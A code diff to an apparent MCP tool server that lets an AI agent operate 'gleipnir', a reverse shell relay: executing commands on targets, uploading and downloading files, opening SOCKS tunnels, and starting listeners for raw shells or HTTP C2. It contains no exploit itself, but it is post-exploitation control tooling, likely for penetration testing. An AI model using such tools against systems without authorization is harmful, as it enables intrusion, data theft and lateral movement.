@@ -338,9 +338,19 @@ server.tool(
 
 // --- Gleipnir (reverse shell relay) -----------------------------------------
 
+const GLEIPNIR_URL = process.env.PK_GLEIPNIR_URL ?? "http://localhost:6666";
 const GLEIPNIR_SOCK = process.env.PK_GLEIPNIR_SOCK ?? "/tmp/gleipnir.sock";
 
-async function gleipnirApi(request: Record<string, unknown>): Promise<Record<string, unknown>> {
+async function gleipnirHttpApi(method: string, path: string, body?: unknown): Promise<Record<string, unknown>> {
+  const opts: RequestInit = { method, headers: { "Content-Type": "application/json" } };
+  if (body) opts.body = JSON.stringify(body);
+  const resp = await fetch(`${GLEIPNIR_URL}${path}`, opts);
+  const data = await resp.json() as Record<string, unknown>;
+  if (!resp.ok) return { ok: false, error: (data as Record<string, string>).error ?? `HTTP ${resp.status}` };
+  return { ok: true, data };
+}
+
+async function gleipnirSocketApi(request: Record<string, unknown>): Promise<Record<string, unknown>> {
   const net = await import("node:net");
   return new Promise((resolve, reject) => {
     const client = net.createConnection(GLEIPNIR_SOCK, () => {
@@ -358,6 +368,41 @@ async function gleipnirApi(request: Record<string, unknown>): Promise<Record<str
   });
 }
 
+async function gleipnirApi(request: Record<string, unknown>): Promise<Record<string, unknown>> {
+  // Try HTTP API first (v2), fall back to Unix socket (v1)
+  const gleipnirUrl = process.env.PK_GLEIPNIR_URL ?? "http://localhost:6666";
+  const actionMap: Record<string, { method: string; path: string }> = {
+    sessions: { method: "GET", path: "/api/sessions" },
+    session: { method: "GET", path: `/api/sessions/${request.name ?? request.session}` },
+    exec: { method: "POST", path: `/api/sessions/${request.session}/exec` },
+    upload: { method: "POST", path: `/api/sessions/${request.session}/upload` },
+    download: { method: "POST", path: `/api/sessions/${request.session}/download` },
+    socks: { method: "POST", path: "/api/tunnels" },
+    tunnels: { method: "GET", path: "/api/tunnels" },
+  };
+  const action = request.action as string;
+  const mapping = actionMap[action];
+  if (mapping) {
+    try {
+      const res = await fetch(`${gleipnirUrl}${mapping.path}`, {
+        method: mapping.method,
+        headers: { "Content-Type": "application/json" },
+        body: mapping.method === "GET" ? undefined : JSON.stringify(request),
+      });
+      const data = await res.json() as Record<string, unknown>;
+      if (!res.ok) throw new Error((data.error as string) ?? `HTTP ${res.status}`);
+      return { ok: true, data };
+    } catch {
+      // HTTP failed, fall through to socket
+    }
+  }
+  try {
+    return await gleipnirSocketApi(request);
+  } catch {
+    throw new Error("gleipnir not reachable via HTTP API or Unix socket");
+  }
+}
+
 server.tool(
   "gleipnir_exec",
   "Execute a command on a target via a gleipnir reverse shell session. Use instead of tooling_exec when you have an active gleipnir session on the target.",
@@ -367,9 +412,16 @@ server.tool(
     timeout: z.number().optional().describe("Timeout in seconds (default 300)"),
   },
   async ({ session, command, timeout }: { session: string; command: string; timeout?: number }) => {
-    const resp = await gleipnirApi({ action: "exec", session, command, timeout: timeout ?? 300 });
-    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
-    return { content: [{ type: "text" as const, text: (resp.data as Record<string, string>).output }] };
+    try {
+      const resp = await gleipnirHttpApi("POST", `/api/sessions/${encodeURIComponent(session)}/exec`, { command, timeout: timeout ?? 300 });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      const data = resp.data as Record<string, string>;
+      return { content: [{ type: "text" as const, text: data.output ?? data.output_b64 ?? JSON.stringify(data) }] };
+    } catch {
+      const resp = await gleipnirApi({ action: "exec", session, command, timeout: timeout ?? 300 });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: (resp.data as Record<string, string>).output }] };
+    }
   },
 );
 
@@ -382,9 +434,15 @@ server.tool(
     dst: z.string().describe("Remote destination path (on the target)"),
   },
   async ({ session, src, dst }: { session: string; src: string; dst: string }) => {
-    const resp = await gleipnirApi({ action: "upload", session, src, dst });
-    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
-    return { content: [{ type: "text" as const, text: `Uploaded ${src} -> ${dst}` }] };
+    try {
+      const resp = await gleipnirHttpApi("POST", `/api/sessions/${encodeURIComponent(session)}/upload`, { src_path: src, dst_path: dst });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: `Uploaded ${src} -> ${dst}` }] };
+    } catch {
+      const resp = await gleipnirApi({ action: "upload", session, src, dst });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: `Uploaded ${src} -> ${dst}` }] };
+    }
   },
 );
 
@@ -397,10 +455,17 @@ server.tool(
     dst: z.string().describe("Local destination path (on the attackbox)"),
   },
   async ({ session, src, dst }: { session: string; src: string; dst: string }) => {
-    const resp = await gleipnirApi({ action: "download", session, src, dst });
-    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
-    const data = resp.data as Record<string, unknown>;
-    return { content: [{ type: "text" as const, text: `Downloaded ${src} -> ${dst} (${data.size} bytes)` }] };
+    try {
+      const resp = await gleipnirHttpApi("POST", `/api/sessions/${encodeURIComponent(session)}/download`, { remote_path: src });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      const data = resp.data as Record<string, unknown>;
+      return { content: [{ type: "text" as const, text: `Downloaded ${src} (${data.size} bytes)` }] };
+    } catch {
+      const resp = await gleipnirApi({ action: "download", session, src, dst });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      const data = resp.data as Record<string, unknown>;
+      return { content: [{ type: "text" as const, text: `Downloaded ${src} -> ${dst} (${data.size} bytes)` }] };
+    }
   },
 );
 
@@ -408,9 +473,15 @@ server.tool(
   "gleipnir_sessions",
   "List active gleipnir reverse shell sessions.",
   async () => {
-    const resp = await gleipnirApi({ action: "sessions" });
-    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
-    return { content: [{ type: "text" as const, text: JSON.stringify(resp.data, null, 2) }] };
+    try {
+      const resp = await gleipnirHttpApi("GET", "/api/sessions");
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: JSON.stringify(resp.data, null, 2) }] };
+    } catch {
+      const resp = await gleipnirApi({ action: "sessions" });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: JSON.stringify(resp.data, null, 2) }] };
+    }
   },
 );
 
@@ -423,10 +494,49 @@ server.tool(
     stop: z.boolean().optional().describe("Set true to stop the tunnel"),
   },
   async ({ session, port, stop }: { session: string; port: number; stop?: boolean }) => {
-    const resp = await gleipnirApi({ action: "socks", session, port, stop: stop ?? false });
+    try {
+      if (stop) {
+        const resp = await gleipnirHttpApi("DELETE", `/api/tunnels/${encodeURIComponent(session)}`);
+        if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+        return { content: [{ type: "text" as const, text: `Tunnel stopped for '${session}'` }] };
+      }
+      const resp = await gleipnirHttpApi("POST", "/api/tunnels", { session, port });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      return { content: [{ type: "text" as const, text: `SOCKS5 proxy for '${session}' on 127.0.0.1:${port}` }] };
+    } catch {
+      const resp = await gleipnirApi({ action: "socks", session, port, stop: stop ?? false });
+      if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+      const msg = stop ? `Tunnel stopped for '${session}'` : `SOCKS5 proxy for '${session}' on 127.0.0.1:${port}`;
+      return { content: [{ type: "text" as const, text: msg }] };
+    }
+  },
+);
+
+server.tool(
+  "gleipnir_listen",
+  "Open a new gleipnir listener on a port. Mode can be 'agent' (native protocol), 'raw' (catch bash/netcat shells), or 'http' (poll-based C2).",
+  {
+    port: z.number().describe("Port to listen on (0 for auto-allocate)"),
+    mode: z.enum(["agent", "raw", "http"]).optional().describe("Listener mode (default: raw)"),
+  },
+  async ({ port, mode }: { port: number; mode?: string }) => {
+    const resp = await gleipnirHttpApi("POST", "/api/listeners", { port, mode: mode ?? "raw" });
     if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
-    const msg = stop ? `Tunnel stopped for '${session}'` : `SOCKS5 proxy for '${session}' on 127.0.0.1:${port}`;
-    return { content: [{ type: "text" as const, text: msg }] };
+    const data = resp.data as Record<string, unknown>;
+    return { content: [{ type: "text" as const, text: `Listener ${data.id} started on port ${data.port} (${data.mode})` }] };
+  },
+);
+
+server.tool(
+  "gleipnir_kill",
+  "Kill an active gleipnir session.",
+  {
+    session: z.string().describe("Session name to kill"),
+  },
+  async ({ session }: { session: string }) => {
+    const resp = await gleipnirHttpApi("DELETE", `/api/sessions/${encodeURIComponent(session)}`);
+    if (!resp.ok) return { content: [{ type: "text" as const, text: `Error: ${resp.error}` }], isError: true };
+    return { content: [{ type: "text" as const, text: `Session '${session}' killed` }] };
   },
 );
 
